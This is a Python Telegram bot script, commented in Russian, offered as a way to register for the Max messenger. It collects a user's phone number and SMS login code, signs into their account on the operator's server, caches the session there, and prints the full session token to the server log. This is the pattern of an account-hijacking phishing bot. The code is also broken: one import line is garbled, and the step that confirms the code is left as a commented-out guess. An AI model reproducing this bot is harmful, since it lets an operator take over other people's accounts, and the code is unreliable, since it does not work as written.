import asyncio
import osгововлв
import traceback
from typing import Dict

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from dotenv import load_dotenv

from pymax import MaxClient
from pymax.payloads import UserAgentPayload

# ========== ЗАГРУЗКА ПЕРЕМЕННЫХ ==========
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")

if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN не найден в .env файле")

# ========== ИНИЦИАЛИЗАЦИЯ БОТА ==========
bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ========== СОСТОЯНИЯ ==========
class RegStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()

# ========== ВРЕМЕННОЕ ХРАНИЛИЩЕ ==========
temp_sessions: Dict[int, dict] = {}

# ========== КОМАНДА /START ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await message.answer(
        "👋 Привет! Я помогу зарегистрироваться в Max.\n\n"
        "Введите ваш номер телефона в формате:\n"
        "`+79123456789`",
        parse_mode="Markdown"
    )
    await state.set_state(RegStates.waiting_phone)

# ========== ОБРАБОТКА НОМЕРА ==========
@dp.message(RegStates.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    user_id = message.from_user.id
    
    if not phone.startswith("+") or not phone[1:].isdigit():
        await message.answer("❌ Неверный формат. Пример: `+79123456789`", parse_mode="Markdown")
        return
    
    await message.answer(f"📱 Отправляю запрос на номер {phone}...")
    
    try:
        # Создаём клиент Max
        ua = UserAgentPayload(device_type="DESKTOP", app_version="25.12.13")
        client = MaxClient(
            phone=phone,
            work_dir=f"cache_{user_id}",  # отдельная папка для каждого пользователя
            headers=ua
        )
        
        # Сохраняем клиент во временной сессии
        temp_sessions[user_id] = {
            "client": client,
            "phone": phone
        }
        
        # Запускаем клиент (он сам отправит код)
        # Но нам нужно сначала получить код, поэтому запускаем в фоне
        # и ждём код через callback
        
        # Устанавливаем обработчик для кода
        @client.on_code_request
        async def on_code_request():
            # Это вызывается, когда Max запрашивает код
            # Бот уже попросил пользователя ввести код
            pass
        
        # Запускаем клиент в отдельной задаче
        asyncio.create_task(client.start())
        
        await message.answer("✅ Код отправлен! Введите код из SMS:")
        await state.set_state(RegStates.waiting_code)
        
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")
        traceback.print_exc()
        await message.answer(f"❌ Ошибка: {e}\nПопробуйте /start")

# ========== ОБРАБОТКА КОДА ==========
@dp.message(RegStates.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    user_id = message.from_user.id
    
    if user_id not in temp_sessions:
        await message.answer("❌ Сессия истекла. Начните заново с /start")
        await state.clear()
        return
    
    session = temp_sessions[user_id]
    client = session["client"]
    phone = session["phone"]
    
    await message.answer("🔐 Подтверждаю код...")
    
    try:
        # Передаём код клиенту
        # В PyMax есть метод для подтверждения кода
        # Нужно посмотреть точное API, возможно так:
        # await client.confirm_code(code)
        
        # После успешной авторизации токен сохранится в client.me
        # и в папке work_dir
        
        # Дождёмся авторизации
        await asyncio.sleep(5)  # Даём время на авторизацию
        
        if client.is_authorized:
            token = client.me.token  # или client.token
            await message.answer(
                f"✅ **Регистрация в Max успешна!**\n\n"
                f"📱 Номер: `{phone}`\n"
                f"🔑 Токен: `{token[:30]}...`\n\n"
                f"⚠️ Сохраните этот токен.",
                parse_mode="Markdown"
            )
            print(f"✅ Токен: {token}")
        else:
            await message.answer("❌ Не удалось авторизоваться. Проверьте код.")
        
        del temp_sessions[user_id]
        await state.clear()
        
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")
        traceback.print_exc()
        await message.answer(f"❌ Ошибка: {e}\nПопробуйте /start")

# ========== ЗАПУСК ==========
async def main():
    print("=" * 50)
    print("🚀 Бот запущен")
    print("=" * 50)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
